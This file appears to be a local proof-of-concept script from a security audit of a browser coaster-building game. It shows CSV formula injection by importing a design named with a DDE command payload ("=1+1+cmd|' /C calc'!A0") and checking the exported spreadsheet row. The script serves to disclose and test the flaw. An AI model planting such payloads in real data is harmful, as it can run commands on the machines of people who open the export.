// PoC 3 — spreadsheet formula injection in the CSV exports via a coaster name from an imported design.
// A shared .coaster.json whose name starts with "=" is opened; the Owner Control Center "Export ride statistics (CSV)"
// then writes that name as the first cell of a row. Local only (tests/harness.js).
// Usage: node reports/security/poc3_csv_formula.js
const path = require('path'), fs = require('fs');
const { open } = require(path.join(__dirname, '../../tests/harness.js'));
const F = path.join(__dirname, 'coaster_lab_v8_6.audit-copy.html');
const NAME = "=1+1+cmd|' /C calc'!A0"; // classic DDE probe; cleanName keeps it (no < > & ")
async function ownGo(page, sec, sub) {
  for (const t of [sub, sec, sub]) { const ok = await page.evaluate(t => { const b = document.querySelector(`#own7 [data-tab="${t}"]`); if (b) b.click(); return !!b }, t); await page.waitForTimeout(300); if (t === sub && ok) return true }
  return false
}
(async () => {
  const { browser, ctx, page, errors } = await open(F, { storage: { 'coasterlab.tut.v2': '1' } });
  page.setDefaultTimeout(120000);
  await page.evaluate(() => window.__coasterDebug.v80.v86.openBuilder()); await page.waitForTimeout(900);
  await page.evaluate(() => document.querySelectorAll('#b8Tour,#dlg7,#bDlg').forEach(e => e.hidden = true));
  const design = { kind: 'coaster', design: { v: 2, name: NAME, els: [['station', {}], ['lift', {}], ['drop', {}], ['turn', {}], ['hill', {}], ['turn', {}]].map(([t, p]) => ({ t, p })) } };
  const inp = await page.$('input[type=file][accept=".json,application/json"]');
  await inp.setInputFiles({ name: 'shared.coaster.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(design)) });
  await page.waitForTimeout(1500); await page.evaluate(() => { const y = document.querySelector('#dlg7:not([hidden]) #dlg7Y,#bDlg:not([hidden]) #bDlgY'); y && y.click() }); await page.waitForTimeout(1500);
  const nm = await page.evaluate(() => window.__coasterDebug.bld.D().name);
  console.log('design name after import + sanDesign/cleanName:', JSON.stringify(nm));
  await page.evaluate(() => window.__coasterDebug.v7.openOwner()); await page.waitForTimeout(500);
  let got = null;
  if (await ownGo(page, 'lab', 'stats72') && await page.$('#own7 [data-a="x72:statsCsv"]')) {
    const [dl] = await Promise.all([page.waitForEvent('download', { timeout: 60000 }), page.click('#own7 [data-a="x72:statsCsv"]')]);
    const p = path.join(__dirname, 'poc3_stats.csv'); await dl.saveAs(p); got = fs.readFileSync(p, 'utf8')
  }
  if (got) { const row = got.split('\n').find(l => l.includes('=1+1')); console.log('CSV row with the imported name:\n  ' + row); console.log(row && /^"=/.test(row) ? 'RESULT: cell begins with "=" -> spreadsheet apps treat it as a formula' : 'RESULT: not reproduced') }
  else console.log('RESULT: CSV export button not found');
  console.log('page errors:', errors.length);
  await browser.close();
})();
